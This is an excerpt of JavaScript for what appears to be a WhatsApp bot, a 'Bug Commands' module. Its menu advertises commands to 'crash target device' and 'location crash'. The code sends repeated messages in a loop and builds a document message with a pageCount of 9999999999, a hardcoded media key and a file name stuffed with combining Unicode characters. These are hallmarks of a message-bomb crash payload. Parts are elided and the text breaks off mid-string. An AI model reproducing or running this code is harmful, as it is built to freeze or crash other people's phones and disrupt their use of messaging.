const { ezra } = require("../../lib/horla");
const { delay, loading, react } = require("../../lib/utils");
...
// bug database
const { bugtext1 } = require("../../lib/lib/bugtext1");
const { bugtext2 } = require("../../lib/lib/bugtext2");
const { bugtext3 } = require("../../lib/lib/bugtext3");
const { bugtext4 } = require("../../lib/lib/bugtext4");
const { bugtext5 } = require("../../lib/lib/bugtext5");
const { bugtext6 } = require("../../lib/lib/bugtext6");
const { bugpdf } = require("../../lib/lib/bugpdf.js");
const { mediaUrls } = require("../../lib/mediaUrls");

const category = "Bug Commands";
const reaction = "🤯";
...
ezra(
    ...
    async (dest, zk, commandOptions) => {
        ...
        const tumbUrl = mediaUrls.bugImages[0];
        let menu = `${mono}Hello✌️ ${ms.pushName}
${timewisher(time)}

BUG COMMANDS MENU:
• bug - Send bug messages
• crash - Crash target device
• loccrash - Location crash
• amountbug <amount>
    ...
    async (dest, zk, commandOptions) => {
        ...
        for (let i = 0; i < 25; i++) {
            ...
            await zk.sendMessage(dest, {
                ...
                thumbnail: {
                    url: mediaUrls.bugImages[1]
                },
                thumbnailUrl: mediaUrls.bugImages[2],
                jpegThumbnail: {
                    url: mediaUrls.bugImages[3]
                },
...
ezra(
    ...
    async (dest, zk, commandOptions) => {
        ...
        const bug = {
            ...
            pageCount: 9999999999,
            thumbnail: {
                url: mediaUrls.bugImages[4]
            },
            thumbnailUrl: mediaUrls.bugImages[5],
            jpegThumbnail: {
                url: mediaUrls.bugImages[6]
            },
            mediaKey: "ht55w7B6UoaG9doQuVQ811XNfWcoALqcdQfd61seKKk=",
            fileName:
                "\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9\n\n" +
